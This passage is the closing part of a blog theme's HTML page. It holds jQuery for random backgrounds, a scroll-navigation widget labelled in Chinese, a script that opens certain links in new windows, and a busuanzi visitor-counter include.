                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 20;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>